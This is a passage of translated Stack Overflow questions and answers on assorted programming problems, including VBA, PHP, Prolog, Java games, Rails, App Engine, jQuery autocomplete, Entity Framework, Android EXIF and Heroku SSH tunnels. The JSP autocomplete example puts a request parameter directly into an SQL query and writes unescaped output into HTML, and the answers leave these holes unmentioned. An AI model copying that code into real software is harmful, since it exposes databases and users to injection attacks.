            newRight.connectChild(2, temp);
        }
        else if (childIndex == 1)
        {
            thisNode.connectChild(1, child1);
            newRight.connectChild(1, child2);
        }
        else if (childIndex == 2)
        {
            temp = newRight.disconnectChild(0);
            thisNode.connectChild(1, child1);
            newRight.connectChild(0, child2);
            newRight.connectChild(1, temp);
        }
    }
    return newRight; 
```

如果有人可以帮助指导我如何以不同的方式思考这个问题，我将不胜感激。我收到的输出要么是我的孩子的顺序不正确，要么是我在某个地方覆盖了一些孩子，或者两者兼而有之。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-06T00:35:58.693

Robert Sedgwich在[Balanced Search Trees](http://algs4.cs.princeton.edu/33balanced/) of Algorithms中讨论了使用四个节点来帮助进行拆分的技术。

# vba - VBA 错误：对象变量或未设置变量

> ID：11917841
> 
> 赞同：3
> 
> 时间：2012-08-11T21:33:50.820
> 
> 标签：vba, excel

在 VBA 中运行此子例程时收到一个奇怪的错误：

```
Sub NameColumns()
' name key columns for later reference in formulas
Dim startdatecol As Integer

' name start date column
startdatecol = ActiveSheet.Cells.Find(What:="Start Date", after:=[a1], LookIn:=xlValues, _
LookAt:=xlPart, SearchOrder:=xlByColumns, SearchDirection:=xlNext, _
MatchCase:=False, SearchFormat:=False).Column
End Sub 
```

> 运行时错误“91”：对象变量或未设置变量

关于如何修复此子程序错误的任何想法？为什么会发生？

谢谢， AME

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-11T21:55:28.537

问题是`Find`没有找到单元格。

您会发现（双关语）以下情况属实：

```
MsgBox ActiveSheet.Cells.Find(What:="Start Date", after:=[a1], LookIn:=xlValues, _
LookAt:=xlPart, SearchOrder:=xlByColumns, SearchDirection:=xlNext, _
MatchCase:=False, SearchFormat:=False) Is Nothing 
```

您应该做的第一件事是修复您的搜索，以便它找到您正在寻找的单元格。

**编辑：**

也许可以更好地说明问题的更改是：

```
Dim found as Range
Dim startDateCol as Integer

Set found = ActiveSheet.Cells.Find(What:="Start Date", after:=[a1], LookIn:=xlValues, _
LookAt:=xlPart, SearchOrder:=xlByColumns, SearchDirection:=xlNext, _
MatchCase:=False, SearchFormat:=False)

If Not found Is Nothing Then startDateCol = found.Column

MsgBox startDateCol 'This will be zero if the "Start Date" cell wasn't found. 
```

**编辑以回应评论：**

```
'This should find the exact text "Start Date" (case sensitive) in the header row.
'A cell containing, for example "The Start Date" will not be matched.
Set found = ActiveSheet.Range("1:1").Find("Start Date", LookIn:=xlValues, _
                                           LookAt:=xlWhole, MatchCase:=True) 
```

# php - 计算 PHP 时间

> ID：11917843
> 
> 赞同：0
> 
> 时间：2012-08-11T21:34:32.573
> 
> 标签：php, time

我到处寻找答案，但我无法解决：

```
if(time() > 1345219200) {
do something
} 
```

那会是什么时候呢？我无法理解它

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-11T21:35:22.407

`time()`指当前时间，并且

`1345219200`指`Fri Aug 17 17:00:00 BST 2012`

PHP 手册页：[日期](http://php.net/manual/en/function.date.php)、[时间](http://php.net/manual/en/function.time.php)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T21:39:51.940

PHP 使用 unix 时间纪元来测量时间。表示自 1970 年 1 月 1 日 00:00:00 GMT 以来的秒数。

该`time()`函数返回自“纪元”以来的当前时间（以秒为单位）。因此，您的 if 语句只是将当前时间与 1345219200 时间戳（正如@abhshkdz 所说）2012 年 8 月 17 日星期五 16:00:00 GMT 进行比较。因此，在那之前，该语句将返回`false`，并且不会发生任何事情。

[您可以在此处](http://php.net/manual/en/function.time.php)阅读有关 PHP 时间函数的更多信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T21:37:37.633

```
echo(date("D F d Y", 1345219200)); 
```

2012 年 8 月 17 日星期五

# list - 使用变量来表示参数？

> ID：11917845
> 
> 赞同：1
> 
> 时间：2012-08-11T21:34:41.440
> 
> 标签：list

如果我有一个庞大的参数列表，例如：

```
program :-
    function(bxcjhbxhcbdbhbxzhbfhxhfbghfghjdfhgxfh),
    another_function(bxcjhbxhcbdbhbxzhbfhxhfbghfghjdfhgxfh). 
```

我可以做类似的事情：

```
program :-
    var = bxcjhbxhcbdbhbxzhbfhxhfbghfghjdfhgxfh
    function(var),
    another_function(var). 
```

?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T21:35:59.753

是的，你可以在 Prolog 中做到这一点。

但是你需要

*   `,`在行尾添加 a `var = ....`）。
*   变量名使用大写首字母。

这有效：

```
function([1, 2]).
another_function([1, 2]).

program :-
    Var = bxcjhbxhcbdbhbxzhbfhxhfbghfghjdfhgxfh,
    function(Var),
    another_function(Var). 
```

# maven - 在本地 maven 存储库中发布 hadoop 安装

> ID：11917847
> 
> 赞同：0
> 
> 时间：2012-08-11T21:34:54.327
> 
> 标签：maven, jar, hadoop, customization

我正在使用预先安装和配置了 hadoop 0.20.205.1 的 AMI 映像。

现在，我有一个项目可以在 Maven 中搜索这个 hadoop 依赖项。

如何将 /usr/share/hadoop 中的 hadoop jar 发布到我的本地 m2 存储库？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-12T14:23:34.650

如果您有简单的 jar，您可以调用 mvn install:install-file 并使用[适当的参数](http://maven.apache.org/plugins/maven-install-plugin/install-file-mojo.html)。

# iphone - XCode 4 中的临时分发

> ID：11917848
> 
> 赞同：0
> 
> 时间：2012-08-11T21:34:57.857
> 
> 标签：iphone, ios, xcode4, distribution, ad-hoc-distribution

我有一个问题，我有临时分发配置文件。我已经完成了所有程序产品/存档，只有两个按钮验证和分发，没有共享按钮。

该怎么办？我按照本教程[http://diaryofacodemonkey.ruprect.com/2011/03/18/ad-hoc-app-distribution-with-xcode-4/](http://diaryofacodemonkey.ruprect.com/2011/03/18/ad-hoc-app-distribution-with-xcode-4/)但没有按钮共享。

我尝试单击分发，然后选择保存为企业或临时分发，然后保存它，但 ipa 文件在 iPhone 上不起作用（.

请帮我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T21:40:36.957

我会尽量为你简化：

1.  为每个 iPhone/iPad 收集 UDID，然后登录到配置文件并打开设备页面并添加它们。
2.  从供应门户生成分发证书
3.  使用 bundle ID 创建新的 APP ID
4.  创建 ad-doc dist。轮廓
5.  登录 iTunes Connect 并创建应用程序详细信息
6.  下载并安装临时配置文件和您生成的证书。
7.  将您的 xcode 项目配置为引用捆绑 ID 并使用您刚刚安装的配置文件对构建进行签名。
8.  归档项目并通过 www.testflightapp.com 分发它，或者只是将 ipa 文件发送给测试人员，以便他们可以通过 iTunes 安装它。
9.  TestFlightApp 将使您的生活更轻松，并节省您告诉测试人员如何通过 itunes 下载 ipa 的时间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T21:43:52.120

您是否将尝试安装的设备的 UUID 注册到您的开发者帐户并添加到您的临时配置文件中？

用于归档的构建配置是否设置为使用此配置文件？

当您归档到 .ipa 时，您是否尝试通过 iTunes 安装它？

# java - 对于基于图块的横向卷轴，如何让角色在跳跃后撞到块时停止？

> ID：11917851
> 
> 赞同：1
> 
> 时间：2012-08-11T21:35:27.840
> 
> 标签：java, swing, graphics, map

好的，所以我制作了一个基本游戏，其中我让一个角色左右移动（使用 a 和 d）并让它跳跃。我现在要做的是得到它，以便生成的地形将允许角色停在它上面。例如，如果角色跳跃，那么当它接触到它时它会停在一个块的顶部。我真正需要的只是一些可以很好地适用于我已经编写的代码的基本代码，而不是整个重写。作为旁注，许多人说使用 KeyBindings 而不是 KeyListener，但 KeyListener 在我处理此编码的方式上工作得更好。谢谢你的帮助！

```
import javax.swing.*;
import javax.swing.event.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.geom.*;
import java.io.*;
import java.net.*;
import java.lang.*;
import static java.lang.Math.*;
import static java.lang.System.out;
import java.util.Random.*;
import java.util.*;
import javax.swing.JApplet;
import java.awt.Graphics;

public class Ultima extends JFrame implements KeyListener
{
    String map [][] = 
    {{" ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {" ", "#", "#", " ", " ", " ", " ", " ", " ", " ", " ", "#", "#", " ", " ", " ", " ", " ", " ", " "},
     {" ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {" ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {" ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {" ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {" ", " ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", "#"},
     {" ", " ", " ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {" ", " ", " ", " ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {" ", " ", " ", " ", " ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", "#", " ", " ", " "},
     {" ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {" ", " ", " ", " ", " ", " ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {" ", " ", " ", " ", " ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", "#"},
     {" ", " ", " ", " ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {" ", " ", " ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {" ", " ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {" ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {" ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {" ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "},
     {"#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " "}};

    int score = 0;
    double gravity = 1;
    boolean jumping = false;
    boolean moveRight = false;
    boolean moveLeft = false;
    boolean jumpRight = false;
    boolean jumpLeft = false;
    boolean moveRightWhileJumping = false;
    boolean moveLeftWhileJumping = false;
    final int WIDTH = 900;
    final int HEIGHT = 650;
    int RESPAWNX = WIDTH/20;
    int RESPAWNY = HEIGHT/2;

    Rectangle charRect = new Rectangle( RESPAWNX, RESPAWNY, 20, 32 );
    JLabel character = new JLabel( new ImageIcon( "characterg.gif" ) );
    JLabel scoreLabel = new JLabel( "Score: " + score );
    JMenuBar mb = new JMenuBar( );
    JMenu menuFile = new JMenu("File");
    JMenuItem menuItemSave = new JMenuItem("Save");
    JMenuItem menuItemLoad = new JMenuItem("Load");

    ArrayList trailList = new ArrayList( );
    Runner runner;
    Container cont;
    JLabel spaceLabel = null;

    public static void main( String args[] )
    {
        new Ultima( );
    }

    public Ultima( )
    {
        super( "Ultima" );
        setSize( WIDTH, HEIGHT );
        setVisible( true );
        setDefaultCloseOperation( JFrame.EXIT_ON_CLOSE );

        cont = getContentPane( );
        cont.setLayout( null );
        addKeyListener( this );
        cont.setBackground( Color.WHITE );

        cont.add( mb );
        setJMenuBar( mb );
        menuFile.add( menuItemSave );
        menuFile.add( menuItemLoad );
        mb.add( menuFile );

        cont.add( scoreLabel );
        scoreLabel.setBounds( 50, 50, 100, 30 );
        scoreLabel.setFont( new Font( "arial", Font.BOLD, 13 ) );
        scoreLabel.setForeground( Color.BLACK );

        cont.add( character );
        character.setBounds( charRect.x, charRect.y, 20, 32 );

    for( int row = 0; row < map.length; row++ )
    {
        for( int col = 0; col < map[0].length; col++ )
        {
            if( map[row][col].equals( "#" ) )
            {
                spaceLabel = new JLabel( new ImageIcon( "block.png" ) );
            }
            else if( map[row][col].equals( " " ) )
            {
                spaceLabel = new JLabel(new ImageIcon( "air.png" ) );
            }
            else
            {

            }
            trailList.add( spaceLabel );
            cont.add( spaceLabel );
            cont.setComponentZOrder( spaceLabel, 1 );
            spaceLabel.setBounds( col*30, row*30, 30, 30 );
        }
    }

    repaint( );
    cont.validate( );
    runner = new Runner( );
    runner.start( );
    setContentPane( cont );
}

public void keyPressed( KeyEvent e )
{
    if( e.getKeyChar( ) == 'd' || e.getKeyChar( ) == 'D' )
    {
        moveRight = true;
    }
    if( e.getKeyChar( ) == 'a' || e.getKeyChar( ) == 'A' )
    {
        moveLeft = true;
    }
}

public void keyReleased( KeyEvent e )
{
    if( e.getKeyChar( ) == 'd' || e.getKeyChar( ) == 'D' )
    {
        moveRight = false;
    }
    if( e.getKeyChar( ) == 'a' || e.getKeyChar( ) == 'A' )
    {
        moveLeft = false;
    }
}

public void keyTyped( KeyEvent e )
{
    if( e.getKeyChar( ) == KeyEvent.VK_SPACE )
    {
        jumping = true;
    }
}

public class Runner extends Thread
{
    public void run( )
    {
        while( true )
        {
            try
            {
                int j = 10;
                double t = 0;

                while( jumping )
                {
                    charRect.y = ( int ) ( charRect.y - j + gravity );
                    gravity *= 1.2;
                    character.setBounds( charRect.x, charRect.y, 20, 32 );
                    repaint( );
                    cont.validate( );
                    t++;
                    Thread.sleep( 30 );//basically, lower #, faster, and higher fps
                }

                if( moveLeft )
                {
                    charRect.x = charRect.x - ( int ) ( j/5 );
                    character.setBounds( charRect.x, charRect.y, 20, 32 );
                    repaint( );
                    cont.validate( );
                    t++;
                    Thread.sleep( 30 );
                }
                if( moveRight )
                {
                    charRect.x = charRect.x + ( int ) ( j/5 );
                    character.setBounds( charRect.x, charRect.y, 20, 32 );
                    t++;
                    Thread.sleep( 30 );
                    repaint( );
                    cont.validate( );
                }
                scoreLabel.setText( "Score: " + score );
            }
            catch( Exception e )
            {
                break;
            }
        }
    }
}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-12T02:06:26.543

我想你会发现[这个](http://higherorderfun.com/blog/2012/05/20/the-guide-to-implementing-2d-platformers/)关于实现 2d 平台游戏的指南很有用。

# java - 跨度标签背景颜色在摆动应用程序中不起作用

> ID：11917853
> 
> 赞同：1
> 
> 时间：2012-08-11T21:35:39.447
> 
> 标签：java, html, swing

我正在使用 html 在 jlist 中显示文本。span 标签的背景颜色没有改变。有什么办法可以尝试更改背景颜色？我还想知道是否有任何工具/在线站点可以验证 Swing 应用程序的 html。

```
<span 'background-color=green'> <b>Name : </b> </span> 
```

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T21:37:49.100

`background-color`是一种 CSS 样式，您可以将其添加到具有`style`属性的 HTML 元素中：

```
<span style="background-color:green"> <b>Name : </b> </span> 
```

您可以使用 W3C 标记验证服务验证 HTML：http: [//validator.w3.org/](http://validator.w3.org/)

# php - 比这更快、更高效的代码？（抓取 9 个唯一的随机行）

> ID：11917865
> 
> 赞同：3
> 
> 时间：2012-08-11T21:37:13.280
> 
> 标签：php, mysql, pdo

注意：我是 PHP 初学者，这就是为什么下面的代码可能不好的原因。

你好。我目前正在使用此代码来选择 9 个唯一的随机行，它工作正常。

```
$quCountRows = $database->query("SELECT * FROM approved")->rowCount();
$arrRandomPictures = array();
while (count($arrRandomPictures) < 9) {
    $randNumber = mt_rand(1, $quCountRows);
    if (!in_array($randNumber, $arrRandomPictures)) {
        $arrRandomPictures[] = $randNumber;
    }
}
$quRandomPicture1 = $database->query("SELECT picName,picType FROM approved WHERE id='".$arrRandomPictures[0]."'")->fetch(PDO::FETCH_ASSOC);
$quRandomPicture2 = $database->query("SELECT picName,picType FROM approved WHERE id='".$arrRandomPictures[1]."'")->fetch(PDO::FETCH_ASSOC);
$quRandomPicture3 = $database->query("SELECT picName,picType FROM approved WHERE id='".$arrRandomPictures[2]."'")->fetch(PDO::FETCH_ASSOC);
$quRandomPicture4 = $database->query("SELECT picName,picType FROM approved WHERE id='".$arrRandomPictures[3]."'")->fetch(PDO::FETCH_ASSOC);
$quRandomPicture5 = $database->query("SELECT picName,picType FROM approved WHERE id='".$arrRandomPictures[4]."'")->fetch(PDO::FETCH_ASSOC);
$quRandomPicture6 = $database->query("SELECT picName,picType FROM approved WHERE id='".$arrRandomPictures[5]."'")->fetch(PDO::FETCH_ASSOC);
$quRandomPicture7 = $database->query("SELECT picName,picType FROM approved WHERE id='".$arrRandomPictures[6]."'")->fetch(PDO::FETCH_ASSOC);
$quRandomPicture8 = $database->query("SELECT picName,picType FROM approved WHERE id='".$arrRandomPictures[7]."'")->fetch(PDO::FETCH_ASSOC);
$quRandomPicture9 = $database->query("SELECT picName,picType FROM approved WHERE id='".$arrRandomPictures[8]."'")->fetch(PDO::FETCH_ASSOC); 
```

虽然它可能有效，但我很确定用更少的查询可以获得相同的结果。希望这会导致页面加载更快。

有什么建议么？

* * *

这是更好的代码。感谢琥珀！

```
$quCountRows = $database->query("SELECT * FROM approved")->rowCount();
$arrRandomPictures = array();
while (count($arrRandomPictures) < 9) {
    $randNumber = mt_rand(1, $quCountRows);
    if (!in_array($randNumber, $arrRandomPictures)) {
        $arrRandomPictures[] = $randNumber;
    }
}
$quRandomPicture = $database->query("SELECT picName,picType FROM approved WHERE id IN (".implode(', ', $arrRandomPictures).")")->fetchAll(PDO::FETCH_ASSOC); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T21:39:56.773

使用`in`代替`==`并传递 ID 列表。这样您就可以从一个查询而不是 9 个查询中获得所有结果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T21:42:05.447

您可以按随机数排序，每次都可以得到其他结果。这样，您只需要一个查询！

```
SELECT picName, picType FROM approved ORDER BY rand() LIMIT 0, 9; 
```

# ruby-on-rails - 如何在 Rails 中使用“渲染”方法渲染普通视图文件？

> ID：11917866
> 
> 赞同：0
> 
> 时间：2012-08-11T21:37:21.627
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.1, ruby-on-rails-3.2

我有 2 个视图文件，`index.html.erb`并且`index.js.erb`. erb 文件显然包含要发送给`yield`调用的所有数据。

现在我想将 的内容插入`index.html.erb`到`#contents`页面上的 div 中，使用`index.js.erb`.

有没有办法将索引 erb 文件渲染到 js.erb 文件中的变量中，以便我可以将其发送给客户端？目前我必须创建一个包含完整 html.erb 文件的部分，并从两个主视图中调用它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T21:44:13.327

在您的 index.js.erb 中（此处为`post`资源示例）：

```
<%= render template: "posts/index.html" %>
<%= render template: "posts/index.html" layout: false %> 
```

Rails 指南中很好地描述了[使用渲染。](http://guides.rubyonrails.org/layouts_and_rendering.html#using-render)

# python - Appengine 上的 Cron 作业 - 第一次开始？

> ID：11917869
> 
> 赞同：0
> 
> 时间：2012-08-11T21:37:42.840
> 
> 标签：python, google-app-engine, cron

我每小时在 Google Appengine 上成功运行一个 cron 作业。但是我希望它在我启动应用程序时启动。现在它在开始后 1 小时执行第一个 cron 作业。

我正在使用 Python。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T23:37:42.270

生产中没有“启动”应用程序。您第一次部署应用程序，crontab 现在存在并且 crontab 调度已启动。因此，我假设您的意思是，除了 cron 计划之外，您每次部署应用程序的新版本时都希望运行 cron 作业。

您可以调用 cron 处理程序，所以为什么不将 appcfg 包装在一个脚本中，该脚本在您执行部署后调用 cron 处理程序。使用 wget/curl 等......

# ajax - 单击后jquery自动搜索结果未将值更新到文本框

> ID：11917874
> 
> 赞同：0
> 
> 时间：2012-08-11T21:38:07.510
> 
> 标签：ajax, jquery

下面的代码显示从数据库填充的列表（不包括数据库代码）。如果我单击搜索结果，则所选选项将不会显示在文本框中。请帮忙。

下面的代码可以很好地在键入字符时显示数据库中的选项列表。问题是它不会将选定的下拉选项显示到文本框中。

```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>jQuery Auto Complete</title>
<script src="jquery/jquery.js" type="text/javascript"></script>

<script type="text/javascript">
function lookup(inputString) {
if(inputString.length == 0) {
$('#suggestions').hide();
} else {
$.post("states.jsp", {queryString: ""+inputString+""}, function(data){
if(data.length >0) {
$('#suggestions').show();
$('#autoSuggestionsList').html(data);
}
});
}
}
function fill(thisValue) {
$('#inputString').val(thisValue);
setTimeout("$('#suggestions').hide();", 200);
}
</script>
<style type="text/css">
body {
font-family: Helvetica;
font-size: 13px;
color: #000;
}
h3 {
margin: 0px;
padding: 0px;
}
.suggestionsBox {
position: relative;
left: 260px;
margin: 0px 0px 0px 0px;
width: 200px;
background-color: #7845DD;
-moz-border-radius: 7px;
-webkit-border-radius: 7px;
border: 2px solid #000;
color: #fff;
}
.suggestionList {
margin: 0px;
padding: 0px;
}
.suggestionList li {
margin: 0px 0px 3px 0px;
padding: 3px;
cursor: pointer;
}
.suggestionList li:hover {
background-color: #DD45CD;
}
</style>
</head>
<body>
<div>
<form>
<div> <h3><font color="red">Indian States</states></font></h3>
<br /> Enter India State Name to see autocomplete
<input type="text" size="30" value="" id="inputString"
onkeyup="lookup(this.value);" onblur="fill();" />
</div>
<div class="suggestionsBox" id="suggestions" style="display: none;">
<div class="suggestionList" id="autoSuggestionsList">
</div>
</div>
</form>
</div>
</body>
</html>

<%
String name=request.getParameter("queryString");
try {
    Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver").newInstance();
    Connection con = DriverManager.getConnection("jdbc:sqlserver://localhost", "user", "password");
    Statement st=con.createStatement();
//Add the data into the database
String sql = "SELECT EMP_EMPLOYEE_ID, EMP_FNAME, EMP_LNAME FROM UAP_EMPLOYEE where EMP_FNAME     LIKE '%"+name+"%' OR EMP_LNAME LIKE '%"+name+"%';"; 
Statement stm = con.createStatement();
stm.executeQuery(sql);
ResultSet rs= stm.getResultSet();
while (rs.next ()){
out.println("<li onclick='fill("+rs.getString("EMP_FNAME")+");>"+rs.getString("EMP_FNAME")+"    </i>");
}}catch(Exception e){
out.println("Exception is ;"+e);
}
%> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T21:47:14.807

在这一行

`$('#autoSuggestionsList').html(data);`

您正在设置一些 html，我假设这些 html 包含`div`带有您的自动建议的标签列表。如果您希望用户能够单击列表，则需要将`click`处理程序附加到加载该值的建议。喜欢

```
$(document).ready(function() {
   $("#autoSuggestionsList div").on("click", function() {
      //put your click actions here.. load the textbox, hide the list
   });
} 
```

该`on`命令是实时的，这意味着它将自动绑定到动态加载的元素。

**编辑**

由于您使用`li`而不是`div`，将上面的内容更改为

```
$(document).ready(function() {
   $("#autoSuggestionsList li").on("click", function() {
      fill($(this).text());
   });
} 
```

**编辑 2**

在您添加的新代码中，此行不正确

```
out.println("<li onclick='fill("+rs.getString("EMP_FNAME")+");>"+rs.getString("EMP_FNAME")+"    </i>"); 
```

它将产生如下所示的错误 HTML/Javascript：

`<li onclick='fill(some text);>some text</i>`

您的代码应如下所示：

```
out.println("<li onclick='fill(\""+rs.getString("EMP_FNAME")+"\");'>"+rs.getString("EMP_FNAME")+"    </li>"); 
```

它将产生以下正确的 HTML/JavascriptL

`<li onclick='fill("some text");'>some text</li>`

# c# - 实体框架如何在多对多关系上插入唯一值而无需手动检查

> ID：11917875
> 
> 赞同：0
> 
> 时间：2012-08-11T21:39:06.787
> 
> 标签：c#, .net, entity-framework-4, many-to-many

有谁知道如何插入唯一值而无需明确检查现有值？

我能够完成这项工作，但我对我必须编写的代码印象不深。基本上，我创建了一个辅助函数来检查容器上的唯一值。

结构非常基本。

[条目] *<----->* [唯一值]

**主要代码**

```
public static void ImportStuff ()
{
    //Generate a list of importable items
    List<DtoItems> items = DtoItemGetter.GetItems();
    using( var container = new MyEntities() )
    {
        foreach( var item in items )
        {
            Entry newEntry = CreateNewEntry( item );

            //******** 
            // Here's the call to my helper method to check 
            // for the uniqueness of the values on the item I am importing
            //******** 
            item.UniqueValuesList.ForEach( 
                uv => HelperMethod( container, newEntry, uv ) );

            containter.AddToEntries( newEntry );

            //Less important... but it would be nice if I didn't 
            // have to save everytime I add an new entry... but 
            // this necessary for the Helper check.
            container.SaveChanges();
        }
    }
} 
```

**辅助方法**

```
public static void HelperMethod( 
    MyEntities container, Entry newEntry, string checkValue )
{
    UniqueItem unique = null;

    //Have to check to see if it already exists in the DB
    container.uniqueItems.ForEach( uv => { 
        if( uv.Name == checkValue )
        {
            unique = uv;
        } } );

    //Here's the money, either add the one I found, or 
    //create a new one... meh
    newEntry.UniqueItems.Add( 
        unique ?? new UniqueItem { Name = checkValue } );
} 
```

希望这有足够的意义。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-12T07:43:49.463

实体框架还不支持唯一约束 - [http://blogs.msdn.com/b/efdesign/archive/2011/03/09/unique-constraints-in-the-entity-framework.aspx](http://blogs.msdn.com/b/efdesign/archive/2011/03/09/unique-constraints-in-the-entity-framework.aspx)

因此，如果您想使用唯一约束，您应该手动在数据库上设置约束并手动检查。

[EF Codefirst 验证唯一属性？](https://stackoverflow.com/questions/4914847/ef-codefirst-validate-unique-property)

# android - 无法写入位置信息

> ID：11917878
> 
> 赞同：1
> 
> 时间：2012-08-11T21:39:25.873
> 
> 标签：android

我正在尝试将位置信息写入使用相机通过我的应用程序拍摄的照片并将控制权返回给应用程序。它在模拟器上运行时运行良好，但是当我在三星上运行时，注入设备位置信息未被捕获。请让我知道我做错了什么。

启动意图的方法

```
private void takePicutre(){
    Intent intent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);

    fileUri = getOutputMediaFileUri(MEDIA_TYPE_IMAGE); 
    intent.putExtra(MediaStore.EXTRA_OUTPUT, fileUri); 
    startActivityForResult(intent, 2);
} 
```

创建用于保存图像的文件 Uri

```
private static Uri getOutputMediaFileUri(int type){
      return Uri.fromFile(getOutputMediaFile(type));
} 
```

创建用于保存图像的文件

```
private static File getOutputMediaFile(int type){
    File mediaStorageDir = new File(Environment.getExternalStoragePublicDirectory(
              Environment.DIRECTORY_PICTURES), "MyApp");

    if (! mediaStorageDir.exists()){
        if (! mediaStorageDir.mkdirs()){
            return null;
        }
    }
        String timeStamp = new
          SimpleDateFormat("yyyyMMdd_HHmmss").format(Calendar.getInstance().getTime());

    File mediaFile;
    if (type == MEDIA_TYPE_IMAGE){
        mediaFile = new File(mediaStorageDir.getPath() + File.separator +
        "IMG_"+ timeStamp + ".jpg");
    } else {
        return null;
    }

    return mediaFile;
} 
```

写入 EXIF 数据

```
@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);

ExifInterface exif;
double latitude = cls_raw_lat;
double longitude = cls_raw_lon;
try {
 exif = new ExifInterface(fileUri.getPath());
 int num1Lat = (int)Math.floor(latitude);
 int num2Lat = (int)Math.floor((latitude - num1Lat) * 60);
 double num3Lat = (latitude - ((double)num1Lat+ ((double)num2Lat/60))) * 3600000;

 int num1Lon = (int)Math.floor(longitude);
 int num2Lon = (int)Math.floor((longitude - num1Lon) * 60);
 double num3Lon = (longitude - ((double)num1Lon+((double)num2Lon/60))) * 3600000;

exif.setAttribute(ExifInterface.TAG_GPS_LATITUDE,
num1Lat+"/1,"+num2Lat+"/1,"+num3Lat+"/1000");                   

exif.setAttribute(ExifInterface.TAG_GPS_LONGITUDE,  
num1Lon+"/1,"+num2Lon+"/1,"+num3Lon+"/1000");

if (latitude > 0) {
    exif.setAttribute(ExifInterface.TAG_GPS_LATITUDE_REF, "N"); 
} else {
    exif.setAttribute(ExifInterface.TAG_GPS_LATITUDE_REF, "S");
}
if (longitude > 0) {
    exif.setAttribute(ExifInterface.TAG_GPS_LONGITUDE_REF, "E");    
} else {
   exif.setAttribute(ExifInterface.TAG_GPS_LONGITUDE_REF, "W");
}

exif.saveAttributes();

} catch (IOException e) {
Toast.makeText(this, "Error: "+e.getMessage(),
Toast.LENGTH_LONG).show();  
}       

} 
```

# ruby-on-rails - 从 Heroku 到远程数据库的 SSH 隧道？

> ID：11917883
> 
> 赞同：3
> 
> 时间：2012-08-11T21:40:05.250
> 
> 标签：ruby-on-rails, heroku, ssh, ssh-tunnel

我正在考虑在 Heroku 上部署一个小型 Rails 应用程序。为了省钱，我希望我的应用程序使用外部数据库（我可以免费访问），而不是 Heroku 托管的数据库。问题是免费数据库只接受本地连接。要从 Heroku 访问它，我需要通过 SSH 隧道进行访问。

Heroku 应用程序是否可以将其数据保存在通过 SSH 访问的外部数据库中？如果是这样，怎么做？

（对于奖励积分，这是第二个问题：这是个好主意吗？一方面，这个方案可以让我免于支付 Heroku 数据库的费用。另一方面，这意味着必须加密我所有的数据库流量。我想这会大大降低我的网络测功机的速度，并减少他们可以服务的请求数量。我在数据库上节省的钱会被用来购买更多的测功机吗？这样做我可能会领先吗？）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-12-08T15:37:09.507

## 是的你可以。

可以在 Heroku**上**建立一条通往外部数据库的隧道。

由于 OP 提到的原因（为了避免为本地数据库付费），您不想这样做，因为@sgrif 提到的原因（它会非常缓慢并且可能不会真正节省任何东西）

但是想要通过隧道连接到外部数据库是有正当理由的，例如，如果数据驻留在需要分析的遗留系统中。

而不是简单地重复我自己（它很长），这是一个对我有用的配方的链接：[来自 Heroku 的 SSH 隧道](https://stackoverflow.com/questions/21575582/ssh-tunneling-from-heroku/27361295#27361295)

* * *

## 回答 #2

> 赞同：1
> 
